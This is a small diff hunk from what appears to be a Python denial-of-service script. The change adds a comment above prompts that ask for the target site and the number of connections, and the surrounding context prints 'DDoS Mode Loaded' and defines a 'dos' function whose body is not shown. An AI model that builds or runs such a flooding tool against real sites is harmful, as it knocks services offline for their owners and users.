@@ -32,6 +32,7 @@ def dos(host, ip):
 def main():
     print("DDoS Mode Loaded")
 
+    # Take host name and number of connections from the user
     host = input("Site you want to DDoS:")
     conn = int(input("How many connections you want to make:"))
 
